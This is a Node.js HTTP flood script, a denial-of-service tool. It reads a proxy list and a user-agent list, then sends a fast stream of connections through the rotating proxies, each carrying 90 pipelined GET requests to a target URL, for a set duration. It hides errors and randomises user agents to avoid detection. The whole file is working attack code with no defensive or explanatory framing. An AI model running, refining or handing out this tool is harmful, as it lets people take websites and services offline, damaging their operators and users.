process.on('uncaughtException', function (err) {
    // console.log(err)
});
process.on('unhandledRejection', function (err) {
    // console.log(err)
});

const net = require('net');
const fs = require('fs');
const url = require('url');

var arg_proxy = process.argv[2]
var arg_ua = process.argv[3];
var arg_time = process.argv[4];
var arg_target = process.argv[5];
const UAs = fs.readFileSync(arg_ua, 'utf-8').replace(/\r/g, '').split('\n');
var parsed = url.parse(arg_target);

var reqs = 0;
var gets = 0;
var starttime = Date.now() / 1000;

var prox = -1;

try {
    var proxies = fs.readFileSync(arg_proxy, 'UTF-8').toString().replace(/\r/g, '').split('\n');
} catch (err) {
    if (err.code !== 'ENOENT') throw err;
    console.log('\x1b[31m Error\x1b[37m: Proxy list not found.');
    console.log("\x1b[36m usage\x1b[37m: node " + require("path").basename(__filename) + " <proxy> <user-agent> <duration> <target>");
    process.exit();
}

function getprox() {
    prox++;
    if (prox >= proxies.length) 
        prox = 0; 
    return prox
};

setInterval(function () {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    var proxy1 = proxies[getprox()].split(":");

    var socket = net.connect(proxy[1], proxy[0]);
    socket.setKeepAlive(true, 0)
    socket.setTimeout(5000);
    socket.once('error', err => {
        // console.log('Error : ' + proxy[0] + ":" + proxy[1]);
        // console.log(err)
    });
    socket.once('data', data => {
        console.log('Connected : ' + proxy[0] + ":" + proxy[1]);
        reqs++;
    });
    for (let j = 0; j < 90; j++) {
        socket.write(
            'GET ' + arg_target + ' HTTP/1.1\r\n' +
            'Host: ' + parsed.host + '\r\n' +
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\n' +
            'user-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\n' +
            'Upgrade-Insecure-Requests: 1\r\n' +
            'Accept-Encoding: gzip, deflate\r\n' +
            'Accept-Language: en-US,en;q=0.9\r\n' +
            'Cache-Control: max-age=0\r\n' +
            'Connection: Keep-Alive\r\n\r\n'
        );
        gets++;
    }

    socket.on('data', function () {
        setTimeout(function () {
            socket.destroy();
            return delete socket;
        }, 130000);
    })
    time1 = Date.now() / 1000;
    process.title = "Reqs: " + Math.floor(reqs / (time1 - starttime)) + " | Gets: " + Math.floor(gets / (time1 - starttime));
});

setTimeout(() => {
    process.exit(7);
}, arg_time * 1000);


console.log(parsed.host, arg_target);
console.log("Time: %s", arg_time);